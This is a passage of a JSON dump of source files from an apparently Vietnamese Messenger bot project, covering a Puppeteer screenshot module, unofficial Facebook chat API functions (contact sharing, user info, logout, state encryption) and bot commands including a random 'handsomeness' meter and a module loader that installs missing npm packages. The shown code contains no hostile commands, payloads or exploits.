{\n\t\t\tlet {url, lineNumber, columnNumber} = message.location();\n\t\t\tlineNumber = lineNumber ? `:${lineNumber}` : '';\n\t\t\tcolumnNumber = columnNumber ? `:${columnNumber}` : '';\n\t\t\tconst location = url ? ` (${url}${lineNumber}${columnNumber})` : '';\n\t\t\tconsole.log(`\\nPage log:${location}\\n${message.text()}\\n`);\n\t\t});\n\n\t\tpage.on('pageerror', error => {\n\t\t\tconsole.log('\\nPage error:', error, '\\n');\n\t\t});\n\n\t\t// TODO: Add more events from https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#event-requestfailed\n\t}\n\n\tif (options.authentication) {\n\t\tawait page.authenticate(options.authentication);\n\t}\n\n\tif (options.cookies) {\n\t\tconst cookies = options.cookies.map(cookie => parseCookie(isHTMLContent ? 'about:blank' : input, cookie));\n\t\tawait page.setCookie(...cookies);\n\t}\n\n\tif (options.headers) {\n\t\tawait page.setExtraHTTPHeaders(options.headers);\n\t}\n\n\tif (options.userAgent) {\n\t\tawait page.setUserAgent(options.userAgent);\n\t}\n\n\tawait page.setViewport(viewportOptions);\n\n\tif (options.emulateDevice) {\n\t\tif (!(options.emulateDevice in puppeteer.devices)) {\n\t\t\tthrow new Error(`The device name \\`${options.emulateDevice}\\` is not supported`);\n\t\t}\n\n\t\tawait page.emulate(puppeteer.devices[options.emulateDevice]);\n\t}\n\n\tawait page.emulateMediaFeatures([{\n\t\tname: 'prefers-color-scheme',\n\t\tvalue: options.darkMode ? 'dark' : 'light'\n\t}]);\n\n\tawait page[isHTMLContent ? 'setContent' : 'goto'](input, {\n\t\ttimeout: timeoutInSeconds,\n\t\twaitUntil: 'networkidle2'\n\t});\n\tif (options.disableAnimations) {\n\t\tawait page.evaluate(disableAnimations, options.disableAnimations);\n\t}\n\n\tif (options.hideElements) {\n\t\tawait page.addStyleTag({\n\t\t\tcontent: `${options.hideElements.join(', ')} { visibility: hidden !important; }`\n\t\t});\n\t}\n\n\tif (options.removeElements) {\n\t\tawait page.addStyleTag({\n\t\t\tcontent: `${options.removeElements.join(', ')} { display: none !important; }`\n\t\t});\n\t}\n\n\tif (options.clickElement) {\n\t\tawait page.click(options.clickElement);\n\t}\n\n\tconst getInjectKey = (ext, value) => isUrl(value) ? 'url' : (value.endsWith(`.${ext}`) ? 'path' : 'content');\n\n\tif (!options.isJavaScriptEnabled) {\n\t\t// Enable JavaScript again for `modules` and `scripts`.\n\t\tawait page.setJavaScriptEnabled(true);\n\t}\n\n\tif (options.modules) {\n\t\tawait Promise.all(options.modules.map(module_ => {\n\t\t\treturn page.addScriptTag({\n\t\t\t\t[getInjectKey('js', module_)]: module_,\n\t\t\t\ttype: 'module'\n\t\t\t});\n\t\t}));\n\t}\n\n\tif (options.scripts) {\n\t\tawait Promise.all(options.scripts.map(script => {\n\t\t\treturn page.addScriptTag({\n\t\t\t\t[getInjectKey('js', script)]: script\n\t\t\t});\n\t\t}));\n\t}\n\n\tif (options.styles) {\n\t\tawait Promise.all(options.styles.map(style => {\n\t\t\treturn page.addStyleTag({\n\t\t\t\t[getInjectKey('css', style)]: style\n\t\t\t});\n\t\t}));\n\t}\n\n\tif (options.waitForElement) {\n\t\tawait page.waitForSelector(options.waitForElement, {\n\t\t\tvisible: true,\n\t\t\ttimeout: timeoutInSeconds\n\t\t});\n\t}\n\n\tif (options.beforeScreenshot) {\n\t\tawait options.beforeScreenshot(page, browser);\n\t}\n\n\tif (options.element) {\n\t\tawait page.waitForSelector(options.element, {\n\t\t\tvisible: true,\n\t\t\ttimeout: timeoutInSeconds\n\t\t});\n\t\tscreenshotOptions.clip = await page.$eval(options.element, getBoundingClientRect);\n\t\tscreenshotOptions.fullPage = false;\n\t}\n\n\tif (options.delay) {\n\t\tawait page.waitForTimeout(options.delay * 1000);\n\t}\n\n\tif (options.scrollToElement) {\n\t\t// eslint-disable-next-line unicorn/prefer-ternary\n\t\tif (typeof options.scrollToElement === 'object') {\n\t\t\tawait page.$eval(options.scrollToElement.element, scrollToElement, options.scrollToElement);\n\t\t} else {\n\t\t\tawait page.$eval(options.scrollToElement, scrollToElement);\n\t\t}\n\t}\n\n\tif (screenshotOptions.fullPage) {\n\t\t// Get the height of the rendered page\n\t\tconst bodyHandle = await page.$('body');\n\t\tconst bodyBoundingHeight = await bodyHandle.boundingBox();\n\t\tawait bodyHandle.dispose();\n\n\t\t// Scroll one viewport at a time, pausing to let content load\n\t\tconst viewportHeight = viewportOptions.height;\n\t\tlet viewportIncrement = 0;\n\t\twhile (viewportIncrement + viewportHeight < bodyBoundingHeight) {\n\t\t\tconst navigationPromise = page.waitForNavigation({waitUntil: 'networkidle0'});\n\t\t\t/* eslint-disable no-await-in-loop */\n\t\t\tawait page.evaluate(_viewportHeight => {\n\t\t\t\t/* eslint-disable no-undef */\n\t\t\t\twindow.scrollBy(0, _viewportHeight);\n\t\t\t\t/* eslint-enable no-undef */\n\t\t\t}, viewportHeight);\n\t\t\tawait navigationPromise;\n\t\t\t/* eslint-enable no-await-in-loop */\n\t\t\tviewportIncrement += viewportHeight;\n\t\t}\n\n\t\t// Scroll back to top\n\t\tawait page.evaluate(_ => {\n\t\t\t/* eslint-disable no-undef */\n\t\t\twindow.scrollTo(0, 0);\n\t\t\t/* eslint-enable no-undef */\n\t\t});\n\n\t\t// Some extra delay to let images load\n\t\tawait page.waitForFunction(imagesHaveLoaded, {timeout: timeoutInSeconds});\n\t}\n\n\tif (options.inset && !screenshotOptions.fullPage) {\n\t\tconst inset = {top: 0, right: 0, bottom: 0, left: 0};\n\t\tfor (const key of Object.keys(inset)) {\n\t\t\tif (typeof options.inset === 'number') {\n\t\t\t\tinset[key] = options.inset;\n\t\t\t} else {\n\t\t\t\tinset[key] = options.inset[key] || 0;\n\t\t\t}\n\t\t}\n\n\t\tlet clipOptions = screenshotOptions.clip;\n\n\t\tif (!clipOptions) {\n\t\t\tclipOptions = await page.evaluate(() => ({\n\t\t\t\tx: 0,\n\t\t\t\ty: 0,\n\t\t\t\t/* eslint-disable no-undef */\n\t\t\t\theight: window.innerHeight,\n\t\t\t\twidth: window.innerWidth\n\t\t\t\t/* eslint-enable no-undef */\n\t\t\t}));\n\t\t}\n\n\t\tconst x = clipOptions.x + inset.left;\n\t\tconst y = clipOptions.y + inset.top;\n\t\tconst width = clipOptions.width - (inset.left + inset.right);\n\t\tconst height = clipOptions.height - (inset.top + inset.bottom);\n\n\t\tif (width === 0 || height === 0) {\n\t\t\tawait page.close();\n\n\t\t\tthrow new Error('When using the `clip` option, the width or height of the screenshot cannot be equal to 0.');\n\t\t}\n\n\t\tscreenshotOptions.clip = {x, y, width, height};\n\t}\n\n\tconst buffer = await page.screenshot(screenshotOptions);\n\n\tawait page.close();\n\n\tif (!options._keepAlive) {\n\t\tawait browser.close();\n\t}\n\n\treturn buffer;\n};\n\nmodule.exports.file = async (url, filePath, options = {}) => {\n\tconst screenshot = await captureWebsite(url, options);\n\n\tawait writeFile(filePath, screenshot, {\n\t\tflag: options.overwrite ? 'w' : 'wx'\n\t});\n};\n\nmodule.exports.buffer = async (url, options) => captureWebsite(url, options);\n\nmodule.exports.base64 = async (url, options) => {\n\tconst screenshot = await captureWebsite(url, options);\n\treturn screenshot.toString('base64');\n};\n\nmodule.exports.devices = Object.values(puppeteer.devices).map(device => device.name);\n\nif (process.env.NODE_ENV === 'test') {\n\tmodule.exports._startBrowser = puppeteer.launch.bind(puppeteer);\n}\n","path":null,"size_bytes":10918,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/shareContact.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn function shareContact(text, senderID, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n\t\tif (!callback || utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\t\tctx.mqttClient.publish('/ls_req', \n\t\t\tJSON.stringify({\n\t\t\t\tapp_id: \"2220391788200892\",\n\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\ttasks: [{\n\t\t\t\t\t\t\tlabel: 359,\n\t\t\t\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\t\t\t\t\"contact_id\": senderID,\n\t\t\t\t\t\t\t\t\"sync_group\": 1,\n\t\t\t\t\t\t\t\t\"text\": text || \"\",\n\t\t\t\t\t\t\t\t\"thread_id\": threadID\n\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\tqueue_name: 'xma_open_contact_share',\n\t\t\t\t\t\t\ttask_id: Math.random() * 1001 << 0,\n\t\t\t\t\t\t\tfailure_count: null,\n\t\t\t\t\t}],\n\t\t\t\t\tepoch_id: utils.generateOfflineThreadingID(),\n\t\t\t\t\tversion_id: '7214102258676893',\n\t\t\t\t}),\n\t\t\t\trequest_id: ++ctx.req_ID,\n\t\t\t\ttype: 3\n\t\t\t}),\n\t\t\t{\n\t\t\t\tqos: 1,\n\t\t\t\tretain: false,\n\t\t\t}\n\t\t);\n\t\tctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"shareContact\"\n        });\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":1387,"size_tokens":null},"modules/commands/dodeptrai.js":{"content":"module.exports.config = {\n    name: \"deptrai\",\n    version: \"0.0.2\",\n    hasPermssion: 0,\n    credits: \"SEN (modified by Assistant)\",\n    description: \"ƒëo ƒë·ªô ƒë·∫πp trai\",\n    commandCategory: \"Nh√≥m\",\n    cooldowns: 5,\n};\n\n// Danh s√°ch UID ƒë∆∞·ª£c ∆∞u ti√™n\nconst privilegedUIDs = [];\n\nmodule.exports.run = function ({ api, event }) {\n    const { senderID } = event; \n    const data = [\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 1%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 2%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 3%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 4%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 5%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 6%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 7%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 8%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 9%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 10%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 11%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 12%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 13%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 14%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 15%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 16%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 17%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 18%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 19%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 20%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 21%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 22%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 23%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 24%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 25%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 26%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 27%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 28%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 29%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 30%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 31%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 32%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 33%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 34%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 35%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 36%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 37%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 38%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 39%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 40%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 41%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 42%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 43%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 44%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 45%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 46%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 47%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 48%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 49%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 50%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 51%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 52%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 53%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 54%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 55%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 56%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 57%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 58%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 59%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 60%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 61%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 62%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 63%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 64%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 65%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 66%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 67%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 68%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 69%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 70%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 71%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 72%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 73%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 74%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 75%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 76%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 77%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 78%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 79%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 80%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 81%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 82%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 83%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 84%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 85%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 86%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 87%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 88%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 89%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 90%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 91%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 92%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 93%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 94%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 95%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 96%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 97%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 98%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 99%\",\n        \"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 100%\",\n    ];\n\n    // Ki·ªÉm tra n·∫øu UID n·∫±m trong danh s√°ch ∆∞u ti√™n\n    if (privilegedUIDs.includes(senderID)) {\n        return api.sendMessage(\"ƒê·ªô ƒë·∫πp trai c·ªßa b·∫°n l√† 99,99% \", event.threadID, event.messageID);\n    }\n\n    // V·ªõi UID kh√¥ng ∆∞u ti√™n, random k·∫øt qu·∫£\n    const randomResult = data[Math.floor(Math.random() * data.length)];\n    return api.sendMessage(randomResult, event.threadID, event.messageID);\n};\n","path":null,"size_bytes":5721,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Base/Step_3.js":{"content":"'use strict';\n\nconst crypto = require('crypto');\nconst aes = require(\"aes-js\");\n\nmodule.exports.encryptState = function encryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let bytes = aes.utils.utf8.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let encryptedData = aesCtr.encrypt(bytes);\n    return aes.utils.hex.fromBytes(encryptedData);\n};\n\nmodule.exports.decryptState = function decryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let encryptedBytes = aes.utils.hex.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let decryptedData = aesCtr.decrypt(encryptedBytes);\n    return aes.utils.utf8.fromBytes(decryptedData);\n};\n","path":null,"size_bytes":836,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserInfoV4.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV4(id, callback) {\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n    \n        if (!callback) {\n            callback = function (err, userInfo) {\n            if (err) return rejectFunc(err);\n            resolveFunc(userInfo);\n            };\n        }\n\n        if (utils.getType(id) !== \"Array\") id = [id];\n\n    var form = {\n        av: ctx.userID,\n        fb_api_caller_class: \"RelayModern\",\n        fb_api_req_friendly_name: \"PresenceStatusProviderSubscription_ContactProfilesQuery\",\n        variables: JSON.stringify({\n            ids: id\n        }),\n        doc_id: 7188178894556645\n    };\n    console.log(form);\ntry {\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(function (resData) {\n            if (resData.error) throw resData;\n                callback(null,resData.data.viewer.chat_sidebar_contact_nodes[0]);\n            })\n            .catch(function (err) {\n                console.log(err);\n                log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n                return callback(err);\n            });\n    }\n    catch (e) {\n        return callback(null, e);\n    }\n    return returnPromise;\n    };\n};","path":null,"size_bytes":1692,"size_tokens":null},"lib/fca-auto/src/logout.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function logout(callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(friendList);\n      };\n    }\n\n    var form = {\n      pmid: \"0\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/bluebar/modern_settings_menu/?help_type=364455653583099&show_contextual_help=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        var elem = resData.jsmods.instances[0][2][0].filter(function (v) {\n          return v.value === \"logout\";\n        })[0];\n\n        var html = resData.jsmods.markup.filter(function (v) {\n          return v[0] === elem.markup.__m;\n        })[0][1].__html;\n\n        var form = {\n          fb_dtsg: utils.getFrom(html, '\"fb_dtsg\" value=\"', '\"'),\n          ref: utils.getFrom(html, '\"ref\" value=\"', '\"'),\n          h: utils.getFrom(html, '\"h\" value=\"', '\"')\n        };\n\n        return defaultFuncs\n          .post(\"https://www.facebook.com/logout.php\", ctx.jar, form)\n          .then(utils.saveCookies(ctx.jar));\n      })\n      .then(function (res) {\n        if (!res.headers) throw { error: \"An error occurred when logging out.\" };\n\n        return defaultFuncs\n          .get(res.headers.location, ctx.jar)\n          .then(utils.saveCookies(ctx.jar));\n      })\n      .then(function () {\n        ctx.loggedIn = false;\n        log.info(\"logout\", \"Logged out successfully.\");\n        callback();\n      })\n      .catch(function (err) {\n        log.error(\"logout\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1959,"size_tokens":null},"modules/commands/cmd.js":{"content":"module.exports.config = {\n  name: \"cmd\",\n  version: \"1.0.0\",\n  hasPermssion: 3,\n  credits: \"Mirai Team\",\n  description: \"Qu·∫£n l√Ω/Ki·ªÉm so√°t to√†n b·ªô module c·ªßa bot\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"[load/unload/loadAll/unloadAll/info] [t√™n module]\",\n  cooldowns: 5,\n  dependencies: {\n      \"fs-extra\": \"\",\n      \"child_process\": \"\",\n      \"path\": \"\"\n  }\n};\n\nconst loadCommand = function ({ moduleList, threadID, messageID }) {\n\n  const { execSync } = global.nodemodule['child_process'];\n  const { writeFileSync, unlinkSync, readFileSync } = global.nodemodule['fs-extra'];\n  const { join } = global.nodemodule['path'];\n  const { configPath, mainPath, api } = global.client;\n  const logger = require(mainPath + '/utils/log');\n\n  var errorList = [];\n  delete require['resolve'][require['resolve'](configPath)];\n  var configValue = require(configPath);\n  writeFileSync(configPath + '.temp', JSON.stringify(configValue, null, 2), 'utf8');\n  for (const nameModule of moduleList) {\n      try {\n          const dirModule = __dirname + '/' + nameModule + '.js';\n          delete require['cache'][require['resolve'](dirModule)];\n          const command = require(dirModule);\n          global.client.commands.delete(nameModule);\n          if (!command.config || !command.run || !command.config.commandCategory) \n              throw new Error('ùêåùê®ùêùùêÆùê•ùêû ùê§ùê°ùê®ÃÇùêßùê† ùêùùêÆÃÅùêßùê† ùêùùê¢Ã£ùêßùê° ùêùùêöÃ£ùêßùê†!');\n          global.client['eventRegistered'] = global.client['eventRegistered']['filter'](info => info != command.config.name);\n          if (command.config.dependencies && typeof command.config.dependencies == 'object') {\n              const listPackage = JSON.parse(readFileSync('./package.json')).dependencies,\n                  listbuiltinModules = require('module')['builtinModules'];\n              for (const packageName in command.config.dependencies) {\n                  var tryLoadCount = 0,\n                      loadSuccess = ![],\n                      error;\n                  const moduleDir = join(global.client.mainPath, 'nodemodules', 'node_modules', packageName);\n                  try {\n                      if (listPackage.hasOwnProperty(packageName) || listbuiltinModules.includes(packageName)) global.nodemodule[packageName] = require(packageName);\n                      else global.nodemodule[packageName] = require(moduleDir);\n                  } catch {\n                      logger.loader('ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê¢ÃÄùê¶ ùê≠ùê°ùêöÃÇÃÅùê≤ ùêèùêöùêúùê§ùêöùê†ùêû ' + packageName + ' ùê°ùê®ÃÇÃÉ ùê≠ùê´ùê®ÃõÃ£ ùêúùê°ùê® ùê•ùêûÃ£ÃÇùêßùê° ' + command.config.name+ 'ùê≠ùê¢ùêûÃÇÃÅùêß ùê°ùêöÃÄùêßùê° ùêúùêöÃÄùê¢ ùêùùêöÃ£ÃÜùê≠...', 'warn');\n                      const insPack = {};\n                      insPack.stdio = 'inherit';\n                      insPack.env = process.env ;\n                      insPack.shell = !![];\n                      insPack.cwd = join(global.client.mainPath,'nodemodules')\n                      execSync('npm --package-lock false --save install ' + packageName + (command.config.dependencies[packageName] == '*' || command.config.dependencies[packageName] == '' ? '' : '@' + command.config.dependencies[packageName]), insPack);\n                      for (tryLoadCount = 1; tryLoadCount <= 3; tryLoadCount++) {\n                          require['cache'] = {};\n                          try {\n                              if (listPackage.hasOwnProperty(packageName) || listbuiltinModules.includes(packageName)) global.nodemodule[packageName] = require(packageName);\n                              else global.nodemodule[packageName] = require(moduleDir);\n                              loadSuccess = !![];\n                              break;\n                          } catch (erorr) {\n                              error = erorr;\n                          }\n                          if (loadSuccess || !error) break;\n                      }\n                      if (!loadSuccess || error) throw 'ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùêöÃâùê¢ ùêèùêöùêúùê§ùêöùê†ùêû ' + packageName + (' ùêúùê°ùê® ùê•ùêûÃ£ÃÇùêßùê° ') + command.config.name +', ùêÑùê´ùê´ùê®ùê´: ' + error + ' ' + error['stack'];\n                  }\n              }\n              logger.loader(' ùêÉùêöÃÉ ùê≠ùêöÃâùê¢ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ùê≠ùê®ùêöÃÄùêß ùêõùê®Ã£ÃÇ ùêèùêöùêúùê§ùêöùê†ùêû ùêúùê°ùê® ùê•ùêûÃ£ÃÇùêßùê°' + command.config.name);\n          }\n          if (command.config.envConfig && typeof command.config.envConfig == 'Object') try {\n              for (const [key, value] of Object['entries'](command.config.envConfig)) {\n                  if (typeof global.configModule[command.config.name] == undefined) \n                      global.configModule[command.config.name] = {};\n                  if (typeof configValue[command.config.name] == undefined) \n                      configValue[command.config.name] = {};\n                  if (typeof configValue[command.config.name][key] !== undefined) \n                      global.configModule[command.config.name][key] = configValue[command.config.name][key];\n                  else global.configModule[command.config.name][key] = value || '';\n                  if (typeof configValue[command.config.name][key] == undefined) \n                      configValue[command.config.name][key] = value || '';\n              }\n              logger.loader('Loaded config' + ' ' + command.config.name);\n          } catch (error) {\n              throw new Error('¬ª ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùêöÃâùê¢ ùêúùê®ùêßùêüùê¢ùê† ùêúùê°ùê® ùê¶ùê®ùêùùêÆùê•ùêû, ùêÑùê´ùê´ùê®ùê´: ' + JSON.stringify(error));\n          }\n          if (command['onLoad']) try {\n              const onLoads = {};\n              onLoads['configValue'] = configValue;\n              command['onLoad'](onLoads);\n          } catch (error) {\n              throw new Error('¬ª ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùêéùêßùê•ùê®ùêöùêù ùê¶ùê®ùêùùêÆùê•ùêû, ùêÑùê´ùê´ùê®ùê´: ' + JSON.stringify(error), 'error');\n          }\n          if (command.handleEvent) global.client.eventRegistered.push(command.config.name);\n          (global.config.commandDisabled.includes(nameModule + '.js') || configValue.commandDisabled.includes(nameModule + '.js')) \n          && (configValue.commandDisabled.splice(configValue.commandDisabled.indexOf(nameModule + '.js'), 1),\n          